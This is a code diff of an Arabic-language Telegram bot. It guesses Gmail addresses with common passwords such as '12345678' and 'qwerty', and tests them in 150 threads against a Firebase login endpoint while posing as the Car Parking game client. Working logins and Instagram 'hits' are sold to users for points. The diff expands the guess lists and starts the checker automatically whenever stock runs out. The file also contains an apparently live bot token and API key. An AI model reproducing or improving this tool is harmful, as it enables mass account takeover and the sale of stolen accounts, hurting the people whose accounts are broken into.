@@ -17,7 +17,7 @@ from telebot import types
 BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
 ADMIN_ID = "7075895496"
 ADMIN_USERNAME = "@XOREYT"
-THREADS = 100
+THREADS = 150
 BOT_LINK = "https://t.me/Xoregrops_bot"
 
 DB_FILE = "database.json"
@@ -61,9 +61,9 @@ ig_running = False
 STOP_FLAG = threading.Event()
 IG_STOP_FLAG = threading.Event()
 lock = threading.Lock()
-admin_states = {} # لتخزين حالة إنشاء الأكواد
+admin_states = {} 
 
-# ================== Flask (لإبقاء السيرفر شغال) ==================
+# ================== Flask ==================
 app = Flask(__name__)
 
 @app.route("/")
@@ -124,7 +124,6 @@ def check_forced_sub(message):
         return False
     return True
 
-# ================== الكيبوردات ==================
 def get_user_keyboard(user_id):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.add("🏪 المتجر", "📸 صيد إنستقرام")
@@ -177,6 +176,7 @@ def check_account(email, password):
         url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
         payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_IOS"}
         headers = {"User-Agent": "CarParking/265", "Content-Type": "application/octet-stream"}
+        
         status, body = http_post(url, payload, headers, timeout=10)
         if status == 200:
             res_json = json.loads(body)
@@ -192,12 +192,17 @@ def check_account(email, password):
             with lock: bad += 1
     except: pass
 
+FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor']
+WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro']
+PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567', '00000000', '12345', 'qwerty']
+
 def generate_credentials():
     pattern = random.randint(0, 3)
-    if pattern == 0: name = random.choice(['john', 'mike', 'sara']) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
-    elif pattern == 1: name = random.choice(['cool', 'fast', 'dark']) + str(random.randint(100, 999))
+    if pattern == 0: name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
+    elif pattern == 1: name = random.choice(FIRST_NAMES) + random.choice(['_', '.']) + random.choice(FIRST_NAMES)
+    elif pattern == 2: name = random.choice(WORDS) + random.choice(['', '123', '2023'])
     else: name = 'user' + str(random.randint(1000, 9999))
-    return name.lower() + '@gmail.com', random.choice(['12345678', 'password', '123456789'])
+    return name.lower() + '@gmail.com', random.choice(PASSWORDS)
 
 def worker():
     while not STOP_FLAG.is_set():
@@ -274,9 +279,15 @@ def buy_hit(call):
     user = get_user(call.from_user.id)
     
     if user["points"] < cost: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
+    
     try:
         with open("stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
-        if len(lines) < amount: return bot.answer_callback_query(call.id, "⚠️ المخزن فاضي.", show_alert=True)
+        
+        if len(lines) < amount:
+            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري صيد حساب لك الآن... انتظر قليلاً.", show_alert=True)
+            if not running:
+                threading.Thread(target=run_checker, daemon=True).start()
+            return
         
         bought = lines[:amount]
         with open("stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[amount:])
@@ -284,7 +295,8 @@ def buy_hit(call):
         user["hits_bought"] += amount
         save_db()
         bot.send_message(call.from_user.id, f"✅ <b>تم الشراء:</b>\n<code>{''.join(bought)}</code>", parse_mode="HTML")
-    except: bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)
+    except Exception as e:
+        bot.answer_callback_query(call.id, "⚠️ خطأ.", show_alert=True)
 
 @bot.message_handler(func=lambda message: message.text == "📸 صيد إنستقرام")
 def shop_ig(message):
@@ -305,7 +317,12 @@ def buy_ig(call):
     if user["points"] < cost[c_type]: return bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
     try:
         with open("ig_stock.txt", 'r', encoding='utf-8') as f: lines = f.readlines()
-        if not lines: return bot.answer_callback_query(call.id, "⚠️ المخزن فاضي.", show_alert=True)
+        
+        if not lines:
+            bot.answer_callback_query(call.id, "⏳ المخزن فاضي، جاري صيد حساب إنستقرام لك... انتظر قليلاً.", show_alert=True)
+            if not ig_running:
+                threading.Thread(target=run_ig_checker, daemon=True).start()
+            return
             
         bought = lines[0]
         with open("ig_stock.txt", 'w', encoding='utf-8') as f: f.writelines(lines[1:])
@@ -453,51 +470,53 @@ def admin_add_points_process(message):
 
 @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📢 إذاعة")
 def admin_broadcast_start(message):
-    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن:")
+    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن (نص، صورة، ملف..):")
     bot.register_next_step_handler(msg, admin_broadcast_send)
 
 def admin_broadcast_send(message):
-    bot.reply_to(message, "⏳ جاري الإرسال...")
+    bot.reply_to(message, "⏳ جاري الإرسال للجميع...")
     count = 0
+    failed = 0
     for uid in list(users.keys()):
         try:
             bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
-            count += 1; time.sleep(0.05)
-        except: pass
-    bot.send_message(ADMIN_ID, f"✅ تم الإرسال لـ {count} شخص.")
+            count += 1
+            time.sleep(0.05)
+        except: failed += 1
+    bot.send_message(ADMIN_ID, f"✅ تم الإرسال إلى {count} شخص.\n❌ فشل: {failed}")
 
 @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📊 الإحصائيات")
 def admin_stats(message):
     total_hits = sum(1 for _ in open("stock.txt")) if os.path.exists("stock.txt") else 0
     ig_hits = sum(1 for _ in open("ig_stock.txt")) if os.path.exists("ig_stock.txt") else 0
-    text = f"📊 <b>إحصائيات:</b>\n👥 المستخدمين: {len(users)}\n🚗 مخزن Car: {total_hits}\n📸 مخزن IG: {ig_hits}\n🎟️ الأكواد: {len(codes)}\n🏃 الحالة: {'شغال' if running else 'متوقف'}"
+    text = f"📊 <b>إحصائيات البوت:</b>\n\n👥 المستخدمين: {len(users)}\n🚗 مخزن Car: {total_hits}\n📸 مخزن IG: {ig_hits}\n🎟️ الأكواد: {len(codes)}\n🏃 الحالة: {'شغال 🟢' if running else 'متوقف 🔴'}"
     bot.reply_to(message, text, parse_mode="HTML")
 
 @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "⚙️ القنوات")
 def admin_channels(message):
     text = "⚙️ <b>القنوات:</b>\n"
     for c_id, c_n in channels.items(): text += f"- {c_n} (<code>{c_id}</code>)\n"
-    text += "\nإضافة: <code>/addchannel @username</code>"
+    text += "\nإضافة: <code>/addchannel @username</code>\nحذف: <code>/delchannel ID</code>"
     bot.reply_to(message, text, parse_mode="HTML")
 
 @bot.message_handler(commands=['addchannel'])
 def add_channel(message):
     if not is_admin(message.from_user.id): return
     try:
-        ch = message.text.split()[1]
+        ch = message.text.split(maxsplit=1)[1]
         if ch.startswith('@'):
             info = bot.get_chat(ch)
             channels[str(info.id)] = info.title
         else: channels[str(ch)] = "قناة " + str(ch)
         save_db()
         bot.reply_to(message, "✅ تم إضافة القناة.")
-    except: bot.reply_to(message, "❌ تأكد أن البوت أدمن في القناة.")
+    except Exception as e: bot.reply_to(message, f"❌ تأكد أن البوت أدمن في القناة.\n{e}")
 
 @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "📤 التصدير")
 def admin_export(message):
     try:
-        if os.path.exists("stock.txt"): bot.send_document(message.chat.id, open("stock.txt", 'rb'), caption="📦 مخزن Car Parking")
-        if os.path.exists("ig_stock.txt"): bot.send_document(message.chat.id, open("ig_stock.txt", 'rb'), caption="📦 مخزن Instagram")
+        if os.path.exists("stock.txt"): bot.send_document(message.chat.id, open("stock.txt", 'rb'), caption="📦 مخزن Car")
+        if os.path.exists("ig_stock.txt"): bot.send_document(message.chat.id, open("ig_stock.txt", 'rb'), caption="📦 مخزن IG")
         bot.send_document(message.chat.id, open(DB_FILE, 'rb'), caption="📁 قاعدة البيانات")
     except: bot.reply_to(message, "❌ خطأ في التصدير.")
 
@@ -510,7 +529,7 @@ def admin_logs(message):
 
 @bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.text == "🚫 الحظر")
 def admin_ban_menu(message):
-    text = "🚫 <b>إدارة الحظر</b>\n\nالأوامر:\n<code>/ban USER_ID</code>\n<code>/unban USER_ID</code>\n\nالمحظورين: " + str(len(banned_users))
+    text = f"🚫 <b>إدارة الحظر</b>\n\nالأوامر:\n<code>/ban USER_ID</code>\n<code>/unban USER_ID</code>\n\nالمحظورين: {len(banned_users)}"
     bot.reply_to(message, text, parse_mode="HTML")
 
 @bot.message_handler(commands=['ban'])
